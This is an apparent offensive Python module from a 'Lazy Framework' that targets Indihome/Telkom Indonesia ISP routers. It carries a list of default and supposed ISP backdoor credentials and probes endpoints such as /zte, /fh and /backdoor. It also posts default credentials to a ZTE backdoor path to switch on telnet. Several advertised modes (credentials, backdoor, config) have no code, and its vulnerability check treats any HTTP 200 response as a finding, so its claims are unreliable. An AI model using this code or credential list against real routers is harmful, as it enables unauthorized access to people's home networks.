#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Indihome Router Exploit Module
Telkom Indonesia ISP Backdoors
"""

import requests
import socket
import time
import re
from pathlib import Path

try:
    from rich.console import Console
    from rich.table import Table
    from rich.panel import Panel
    from rich.syntax import Syntax
    console = Console()
except ImportError:
    class SimpleConsole:
        def print(self, msg): 
            print(msg)
    console = SimpleConsole()

import urllib3
urllib3.disable_warnings()

MODULE_INFO = {
    "name": "Indihome Router Exploit",
    "description": "Indihome/Telkom Indonesia ISP backdoors and vulnerabilities",
    "author": "Lazy Framework Team",
    "license": "MIT",
    "platform": "linux",
    "arch": "arm,mips",
    "rank": "High",
    "references": [
        "Telkom Indonesia Backdoors",
        "ZTE/FiberHome Custom Firmware"
    ],
    "dependencies": ["requests"]
}

OPTIONS = {
    "RHOST": {"description": "Target IP", "required": True, "default": "192.168.1.1"},
    "RPORT": {"description": "Web port", "required": False, "default": "80"},
    "PROTO": {"description": "HTTP protocol", "required": False, "default": "http", "choices": ["http", "https"]},
    "USERNAME": {"description": "Username", "required": False, "default": "admin"},
    "PASSWORD": {"description": "Password", "required": False, "default": "admin"},
    "MODE": {
        "description": "Exploit mode",
        "required": False,
        "default": "detect",
        "choices": ["detect", "telnet", "credentials", "backdoor", "config"]
    }
}

# Indihome Specific Credentials
INDIHOME_CREDS = [
    ("admin", "admin"),
    ("admin", "1234"),
    ("user", "user"),
    ("telecomadmin", "admintelecom"),
    ("telecomadmin", "nE7jA%5m"),
    ("root", "root"),
    ("support", "support"),
]

class IndihomeExploit:
    def __init__(self, target, port=80, proto="http", username="admin", password="admin"):
        self.target = target
        self.port = port
        self.proto = proto
        self.username = username
        self.password = password
        self.base_url = f"{proto}://{target}:{port}"
        self.session = requests.Session()
        if proto == "https":
            self.session.verify = False
        
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0',
            'Referer': f'{self.base_url}/'
        })
    
    def detect_device(self):
        """Detect Indihome router"""
        console.print("\n[bold yellow]=== Indihome DETECTION ===[/bold yellow]")
        
        try:
            r = self.session.get(f"{self.base_url}/", timeout=10)
            html_content = r.text.lower()
            
            indihome_detected = False
            if "indihome" in html_content or "telkom" in html_content:
                indihome_detected = True
                console.print("[green]✓ Indihome router detected[/green]")
            
            # Test for common vulnerabilities
            vulns = self.test_vulnerabilities()
            
            return {
                'is_indihome': indihome_detected,
                'vulnerabilities': vulns
            }
                
        except Exception as e:
            console.print(f"[red]✗ Detection failed: {str(e)}[/red]")
            return {'is_indihome': False}
    
    def test_vulnerabilities(self):
        """Test Indihome specific vulnerabilities"""
        console.print("[bold yellow][*] Testing Indihome vulnerabilities...[/bold yellow]")
        
        vulns = []
        
        # Test ZTE/FiberHome backdoors
        endpoints = [
            "/fh", "/zte", "/backdoor", "/debug",
            "/api/device/telnet", "/cgi-bin/telnet"
        ]
        
        for endpoint in endpoints:
            try:
                url = f"{self.base_url}{endpoint}"
                r = self.session.get(url, timeout=5)
                if r.status_code == 200:
                    vulns.append(endpoint)
                    console.print(f"[green]✓ Vulnerability found: {endpoint}[/green]")
            except:
                continue
        
        return vulns
    
    def enable_telnet(self):
        """Enable telnet on Indihome router"""
        console.print("[bold yellow][*] Enabling telnet...[/bold yellow]")
        
        try:
            # Try ZTE backdoor
            zte_url = f"{self.base_url}/zte"
            payload = {"username": "admin", "password": "admin"}
            
            r = self.session.post(zte_url, data=payload, timeout=10)
            if r.status_code == 200:
                console.print("[green]✓ Telnet enabled via ZTE backdoor[/green]")
                return True
        except Exception as e:
            console.print(f"[red]✗ Telnet enable failed: {str(e)}[/red]")
        
        return False

def run(session, options):
    """Main Indihome exploit function"""
    console.print(Panel("Indihome Router Exploit", style="bold red"))
    
    rhost = options.get("RHOST", "192.168.1.1")
    rport = options.get("RPORT", "80")
    proto = options.get("PROTO", "http")
    username = options.get("USERNAME", "admin")
    password = options.get("PASSWORD", "admin")
    mode = options.get("MODE", "detect")
    
    console.print(f"[bold yellow][*] Target: {proto}://{rhost}:{rport}[/bold yellow]")
    
    try:
        exploit = IndihomeExploit(rhost, rport, proto, username, password)
        
        if mode == "detect":
            result = exploit.detect_device()
            if result['is_indihome']:
                console.print("[green]✓ Indihome router detected[/green]")
                console.print(f"[cyan]Vulnerabilities: {len(result['vulnerabilities'])}[/cyan]")
            else:
                console.print("[red]✗ Not an Indihome router[/red]")
        
        elif mode == "telnet":
            exploit.enable_telnet()
        
        return True
        
    except Exception as e:
        console.print(f"[bold red]✗ Error: {str(e)}[/red]")
        return False
